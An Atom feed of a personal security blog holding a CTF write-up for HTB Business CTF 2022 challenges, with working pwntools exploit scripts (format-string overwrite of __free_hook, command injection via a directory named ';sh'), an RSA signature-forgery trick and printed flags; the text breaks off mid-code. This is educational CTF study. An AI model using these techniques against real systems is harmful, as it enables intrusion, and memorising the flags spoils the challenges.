<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-04-12T03:42:43+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hacky Life &amp;amp; Writeup</title><subtitle>be the special st4rlight in the world üå†</subtitle><author><name>st4rlight (Ainsetin)</name></author><entry><title type="html">CTF Write-up [test]</title><link href="http://localhost:4000/ctf/ctf_test/" rel="alternate" type="text/html" title="CTF Write-up [test]" /><published>2024-07-19T14:00:00+09:00</published><updated>2024-07-19T14:00:00+09:00</updated><id>http://localhost:4000/ctf/ctf_test</id><content type="html" xml:base="http://localhost:4000/ctf/ctf_test/"><![CDATA[<h2 id="summary">Summary</h2>
<p>Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic.<br />
pwn focused on FSB attack or ezpz kernel exploitation.<br />
RSA, elgamel simple attack in crypto. and etc..</p>

<h2 id="tasks">Tasks</h2>

<ul>
  <li>Pwnableüíª
    <ul>
      <li><a href="#pwn--payback">Payback</a></li>
      <li><a href="#pwn--insider">Insider</a></li>
      <li><a href="#pwn--opendoor">OpenDoor</a></li>
    </ul>
  </li>
  <li>Cryptographyüí°
    <ul>
      <li><a href="#crypto--bbgun06">BBGun06 (+ revenge)</a></li>
      <li><a href="#crypto--elelgamal">ElElGamal</a></li>
    </ul>
  </li>
  <li>Reversing‚öôÔ∏è
    <ul>
      <li><a href="#rev--breakout">BreakOut</a></li>
      <li><a href="#rev--chromeminer">ChromeMiner, Assisted</a></li>
    </ul>
  </li>
  <li>Forensicüîé
    <ul>
      <li><a href="#for--linas-invitation">Lina‚Äôs Invitation</a></li>
    </ul>
  </li>
</ul>

<h2 id="pwn--payback">PWN : Payback</h2>

<h3 id="1-analyze">1. Analyze</h3>
<p>mitigations are here:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b<span class="s1">'./.glibc/'</span>
</code></pre></div></div>
<p>I found that <code class="language-plaintext highlighter-rouge">delete_bot</code> function has Format string bug when I send delete_reason.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">delete_bot</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">id</span> <span class="o">=</span> <span class="n">getId</span><span class="p">();</span> <span class="c1">// 0 ~ 31</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">char</span> <span class="n">reasonbuf</span><span class="p">[</span><span class="n">MAX_REASON_SIZE</span><span class="p">];</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">reasonbuf</span><span class="p">,</span> <span class="sc">'\x00'</span><span class="p">,</span> <span class="n">MAX_REASON_SIZE</span><span class="p">);</span>
        <span class="c1">// gather statistics</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Enter the reason of deletion: "</span><span class="p">);</span>
        <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reasonbuf</span><span class="p">,</span> <span class="n">MAX_REASON_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">free</span><span class="p">(</span><span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span><span class="p">);</span>
        <span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Bot Deleted successfully! | Reason: "</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">reasonbuf</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error: Unable to fetch the requested bot entry.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">reasonbuf</code> is in a stack area so I can check FSB attack offset with input buffer.<br />
If I manage <code class="language-plaintext highlighter-rouge">__free_hook</code>, I can call <code class="language-plaintext highlighter-rouge">system("/bin/sh\x00")</code> when I call <code class="language-plaintext highlighter-rouge">delete_bot</code>.<br />
Setting bot‚Äôs URL to <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> and calling free can trigger shell.<br />
Let‚Äôs exploit!</p>

<h3 id="2-exploit-code">2. Exploit Code</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># p=process("./payback")
</span><span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">142.93.37.110</span><span class="sh">"</span><span class="p">,</span><span class="mi">30669</span><span class="p">)</span>
<span class="n">e</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./payback</span><span class="sh">"</span><span class="p">)</span>
<span class="n">l</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">.glibc/libc.so.6</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">fsb_pay</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
    <span class="nf">pause</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="n">fsb_pay</span><span class="p">)</span>

<span class="nf">add</span><span class="p">()</span>
<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">%p</span><span class="sh">"</span><span class="p">)</span>
<span class="c1"># overwrite offset : 8
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Reason: </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1ed723</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="nf">add</span><span class="p">()</span>

<span class="n">low</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
<span class="n">high</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span>

<span class="k">if</span> <span class="n">mid</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
    <span class="n">rmid</span> <span class="o">=</span> <span class="n">mid</span><span class="o">-</span><span class="n">low</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">rmid</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="o">+</span><span class="n">mid</span><span class="o">-</span><span class="n">low</span>

<span class="k">if</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">mid</span><span class="p">:</span>
    <span class="n">rhigh</span> <span class="o">=</span> <span class="n">high</span><span class="o">-</span><span class="n">mid</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">rhigh</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="o">+</span><span class="n">high</span><span class="o">-</span><span class="n">mid</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">low</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">mid</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">high</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%{}c</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">low</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%13$hn</span><span class="sh">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%{}c</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">rmid</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%14$hn</span><span class="sh">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%{}c</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">rhigh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">%15$hn</span><span class="sh">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
<span class="c1">#print(len(payload))
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>

<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="nf">add</span><span class="p">()</span>
<span class="nf">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p><img src="/images/2022-htb_businessctf/1.png" alt="1.png" /></p>

<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}</code>.</p>

<hr />

<h2 id="pwn--insider">PWN : Insider</h2>

<h3 id="1-analyze-1">1. Analyze</h3>
<p>Binary run FTP cli program with 30 commands.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">USER ;)</code> : compare with <code class="language-plaintext highlighter-rouge">;)</code> string, if it‚Äôs correct, prepare <code class="language-plaintext highlighter-rouge">PASS</code> command.</li>
  <li><code class="language-plaintext highlighter-rouge">PASS ;)</code> : same with <code class="language-plaintext highlighter-rouge">USER</code> command, if password correct, I can use all of cmds.</li>
  <li><code class="language-plaintext highlighter-rouge">BKDR [payload]</code> : short expression of <code class="language-plaintext highlighter-rouge">backdoor</code> I think, it can be attacked by FSB with limited condition.</li>
  <li><code class="language-plaintext highlighter-rouge">LIST</code> : get current working directory (CWD) by using <code class="language-plaintext highlighter-rouge">getcwd()</code> function.<br />
also run <code class="language-plaintext highlighter-rouge">ls -al [result of getcwd()]</code> with <code class="language-plaintext highlighter-rouge">popen</code>.<br />
if process run successfully, result should be written in console.</li>
  <li><code class="language-plaintext highlighter-rouge">CWD [path]</code> : change working directory with my own path.</li>
  <li><code class="language-plaintext highlighter-rouge">MKDR [path]</code> : make directory with my own path.</li>
  <li>.. etc</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">BKDR</code> command can leak stack area or overwrite stack area.<br />
I found unchanged stack position that makes denied access to <code class="language-plaintext highlighter-rouge">LIST</code> command.<br />
(value : -1, <code class="language-plaintext highlighter-rouge">LIST</code> NOT ALLOWED!)</p>

<p>at first, I used <code class="language-plaintext highlighter-rouge">RETR</code> command to read <code class="language-plaintext highlighter-rouge">/flag.txt</code>, but this file‚Äôs permission is only <code class="language-plaintext highlighter-rouge">read in root</code>, <code class="language-plaintext highlighter-rouge">r--------</code>.
Need to find another way..</p>

<p><img src="/images/2022-htb_businessctf/2.png" alt="2.png" /></p>

<p><code class="language-plaintext highlighter-rouge">v131</code> should be more than 0, so if I found right offset of <code class="language-plaintext highlighter-rouge">v131</code>, can be overwritten by <code class="language-plaintext highlighter-rouge">%[offset]$n</code>.</p>

<h3 id="2-after-getting-shell">2. After Getting shell..?</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">MKDR ;sh</code> : make directory named <code class="language-plaintext highlighter-rouge">;sh</code>. it‚Äôs legal expression in linux.</li>
  <li><code class="language-plaintext highlighter-rouge">CWD ;sh</code> : change working directory to <code class="language-plaintext highlighter-rouge">/home/ctf/;sh</code></li>
  <li><code class="language-plaintext highlighter-rouge">LIST</code> : call <code class="language-plaintext highlighter-rouge">getcwd()</code> =&gt; <code class="language-plaintext highlighter-rouge">/home/ctf/;sh</code> and combine string (result : <code class="language-plaintext highlighter-rouge">ls -al /home/ctf/;sh</code>) !!!SHELL EXECUTED!!!</li>
  <li>In the shell, <code class="language-plaintext highlighter-rouge">cd /home/ctf</code> =&gt; I noticed that <code class="language-plaintext highlighter-rouge">get_flag</code> file‚Äôs RUNPATH is <code class="language-plaintext highlighter-rouge">./</code>, so changing working directory to <code class="language-plaintext highlighter-rouge">/home/ctf</code> is necessary.</li>
  <li>In the shell, <code class="language-plaintext highlighter-rouge">./get_flag</code> =&gt; Execute!</li>
  <li>In the shell, <code class="language-plaintext highlighter-rouge">exit</code> =&gt; for receiving results of entire commands.<br />
(because commands is running in <code class="language-plaintext highlighter-rouge">popen</code> process)</li>
</ol>

<h3 id="3-exploit-code">3. Exploit Code</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#context.log_level = 'debug'
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">104.248.175.153</span><span class="sh">"</span><span class="p">,</span><span class="mi">30467</span><span class="p">)</span>
<span class="c1">#p = process('./chall')
</span>
<span class="k">def</span> <span class="nf">qwer</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">noRecv</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">noRecv</span><span class="p">:</span>  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
        <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">USER ;)</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">PASS ;)</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">BKDR %p %p %p %p %p %p %p</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">(nil) 0x</span><span class="sh">"</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x66c0</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">BKDR</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s"> %1035$n</span><span class="sh">'</span>

<span class="c1">#pause()
</span><span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">ASDF</span><span class="sh">"</span>
<span class="nf">qwer</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="c1">#qwer("STOR .profile")
#qwer("alias ls='sh;ls'".ljust(0x1000, 'a') + 'LIST', True)
#p.shutdown('send')
</span>
<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">MKDR ;sh</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">CWD ;sh</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">qwer</span><span class="p">(</span><span class="sh">"</span><span class="s">LIST</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">cd /home/ctf</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">./get_flag</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">exit</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}</code>.</p>

<hr />

<h2 id="pwn--opendoor">PWN : OpenDoor</h2>
<p>! REDACTED !<br />
Exploit Code : <a href="https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb" target="_blank">https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb</a></p>

<hr />

<h2 id="crypto--bbgun06">CRYPTO : BBGun06</h2>
<h3 id="1-analyze-2">1. Analyze</h3>

<p>BBGun06 / revenge has same <code class="language-plaintext highlighter-rouge">verify(self,message, signature)</code> code:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">signature</span><span class="p">):</span>
        <span class="n">keylength</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">n</span><span class="p">))</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>
        <span class="n">clearsig</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="n">keylength</span><span class="p">,</span> <span class="sh">"</span><span class="s">big</span><span class="sh">"</span><span class="p">)</span>

        <span class="n">r</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x01\xff</span><span class="s">+?</span><span class="se">\x00</span><span class="s">(.{15})(.{20})</span><span class="sh">'</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
        <span class="n">m</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">clearsig</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nc">VerificationError</span><span class="p">(</span><span class="sh">'</span><span class="s">Verification failed</span><span class="sh">'</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="n">self</span><span class="p">.</span><span class="n">asn1</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nc">VerificationError</span><span class="p">(</span><span class="sh">'</span><span class="s">Verification failed</span><span class="sh">'</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">sha1</span><span class="p">(</span><span class="n">message</span><span class="p">).</span><span class="nf">digest</span><span class="p">():</span>
            <span class="k">raise</span> <span class="nc">VerificationError</span><span class="p">(</span><span class="sh">'</span><span class="s">Verification failed</span><span class="sh">'</span><span class="p">)</span>

        <span class="k">return</span> <span class="bp">True</span>
</code></pre></div></div>

<p>And en/decrypt function changes signature code(byte) to long by using <code class="language-plaintext highlighter-rouge">bytes_to_long</code> to calculate with integer.<br />
Decrypted message is same when I give bytes string that has same integer result. That means, <code class="language-plaintext highlighter-rouge">dec("0001") == dec("01")</code>.
It‚Äôs simple!<br />
send given signature with <code class="language-plaintext highlighter-rouge">00</code> :D, <code class="language-plaintext highlighter-rouge">00 + sig</code><br />
revenge prob has the same solving process lol:) See below.</p>
<h3 id="2-exploit-manual">2. Exploit (Manual)</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// for_BBGun06
signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10

...
// for_BBGun06 revenge
Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10
HTB<span class="o">{</span>8131ch3n84ch32<span class="s1">'06_519n47u23_f02932y}
</span></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f

...

Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f
HTB<span class="o">{</span>1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32<span class="s1">'s}
</span></code></pre></div></div>

<hr />

<h2 id="crypto--elelgamal">CRYPTO : ElElGamal</h2>
<p>I didn‚Äôt know about ElGamal in cryptography, so I searched a lot.<br />
writing‚Ä¶
‚Äî</p>

<h2 id="rev--breakout">REV : BreakOut</h2>

<h3 id="1-flag-recovering">1. FLAG Recovering</h3>
<ol>
  <li>Connect <code class="language-plaintext highlighter-rouge">URL:port/proc/self/maps</code> and see what prob should be the base program. <code class="language-plaintext highlighter-rouge">/bkd</code> is running!</li>
  <li>Download <code class="language-plaintext highlighter-rouge">bkd</code> file in website.</li>
  <li>Realize it‚Äôs web server made by C++.</li>
  <li>Find <code class="language-plaintext highlighter-rouge">secretGet</code> function and get flag.</li>
</ol>

<h3 id="2-get-flag">2. Get FLAG</h3>
<p><img src="/images/2022-htb_businessctf/3.png" alt="3.png" /></p>

<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}</code>.</p>

<hr />

<h2 id="rev--chromeminer">REV : ChromeMiner</h2>

<p>Fully obfuscated js Challenge.</p>

<h3 id="1-recover-with-hand">1. Recover with hand</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nf">iF</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="dl">'</span><span class="s1">injected</span><span class="dl">'</span> <span class="k">in</span> <span class="nb">document</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">injected</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
